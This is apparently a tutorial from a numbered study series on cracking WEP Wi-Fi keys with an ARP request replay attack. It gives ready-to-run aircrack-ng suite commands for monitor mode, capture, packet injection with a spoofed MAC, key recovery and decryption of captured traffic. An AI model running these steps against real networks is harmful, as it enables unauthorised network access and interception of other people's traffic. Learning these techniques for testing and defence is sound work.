# Chain #19: ARP Request Replay Attack

## Purpose
Turn a captured ARP request into a high‑volume IV generator to speed up WEP key recovery with aircrack‑ng.

---
## Key Terms

- **IV (Initialization Vector)**: 24‑bit nonce prepended to the WEP key for RC4. Collecting many IVs enables statistical key recovery.
- **ARP (Address Resolution Protocol)**: Small, easily recognizable broadcast packets in LANs; ideal for replay because APs respond quickly.
- **ARP Request Replay (aireplay‑ng `-3`)**: Listens for a valid ARP request, re‑injects it to the AP, which re‑sends it repeatedly with new IVs.
- **PTW vs. Korek/FMS**: Aircrack‑ng’s default **PTW** statistical attack needs fewer IVs than older **Korek/FMS** methods.

---
## Step‑by‑Step Workflows

### 1) Enable monitor mode (see Chain 01/03 for background)

```bash
sudo airmon-ng start wlan0
```

- If warned about NetworkManager / wpa_supplicant, consider: `sudo airmon-ng check kill`.    
- Confirm:

```bash
iwconfig
# Expect: wlan0mon  IEEE 802.11  Mode:Monitor ...
```

### 2) Passive capture on the target AP (collect frames + IVs)

Lock to the AP’s channel and write captures to disk:

```bash
sudo airodump-ng wlan0mon -c 1 -w WEP
# -> creates WEP-01.cap (and related files)
```

- Optional focus on one BSSID: add `--bssid <AP_BSSID>`.

### 3) Launch ARP Request Replay (in a second terminal)

```bash
sudo aireplay-ng -3 -b B2:D1:AC:E1:21:D1 -h 4A:DD:C6:71:5A:3B wlan0mon
```

- `-3` = ARP request replay mode.
- `-b` = target AP BSSID.
- `-h` = your (spoofed or actual) client MAC used for injection.
- Tip: If you see **“The interface MAC ... doesn’t match the specified MAC (-h)”**, align them:

```bash
sudo ifconfig wlan0mon hw ether 4A:DD:C6:71:5A:3B
```

- Keep **airodump‑ng** running to capture replies while aireplay‑ng re‑injects.
- Healthy output looks like rapidly rising “got ARP requests … sent … (XXX pps)”.

### 4) Crack the WEP key with aircrack‑ng

After enough IVs accumulate in `WEP-01.cap`, attempt cracking:

```bash
sudo aircrack-ng -b B2:D1:AC:E1:21:D1 WEP-01.cap
# Default: PTW attack when applicable
```

- If you explicitly want Korek/FMS heuristics:

```bash
sudo aircrack-ng -K WEP-01.cap
```

### 5) Use the recovered key

Two common follow‑ups:

- **Connect** to the WEP network (see Chain 07’s WEP config with `wpa_supplicant`).    
- **Decrypt the capture** offline for analysis:

```bash
sudo airdecap-ng -w <WEP_hex_key> WEP-01.cap
# -> WEP-01-dec.cap
```

---
## Reference Snippets / Flags

- Monitor‑mode check: `iwconfig` → look for `Mode:Monitor`.    
- Airodump‑ng essentials:
    - `-c <ch>`: lock channel.
    - `--bssid <AP>`: stick to one AP.
    - `-w <prefix>`: write capture files.
- Aireplay‑ng (ARP replay):
    - `-3`: ARP request replay.
    - `-b <BSSID>`: target AP MAC.
    - `-h <STA>`: sender MAC used in injected frames.
- Aircrack‑ng:
    - default PTW (when data supports it).
    - `-K`: Korek/FMS methods.

---
## Summary

1. Put your NIC in **monitor mode**. 2) **Capture** on the AP’s channel with `airodump-ng`. 3) **Re‑inject** ARP requests with `aireplay-ng -3` to force the AP to emit many **new IVs**. 4) **Crack** with `aircrack-ng` (PTW by default). 5) **Use** the key to connect or decrypt captures.    

---
## Appendix – Fact‑Check Notes

- **Mechanics of ARP Request Replay** (capture ARP → re‑inject → AP resends with new IVs): Aircrack‑ng wiki “ARP request reinjection”. aircrack-ng.org/doku.php?id=arp-request_reinjection    
- **Aireplay‑ng purpose & `-3` attack**: Aircrack‑ng tool page. aircrack-ng.org/doku.php?id=aireplay-ng
- **PTW vs. FMS/Korek data needs**: Sources vary by dataset and success threshold. Aircrack‑ng docs emphasize “very few packets” for PTW; Wikipedia summarizes research as ~35–40k packets for ~50% success with PTW and hundreds of thousands to ~1M+ for FMS/Korek depending on conditions. aircrack-ng.org/doku.php?id=aircrack-ng ; en.wikipedia.org/wiki/Aircrack-ng
- **Using Airdecap‑ng after key recovery**: See Chain 05 in this series for exact flags and workflow.
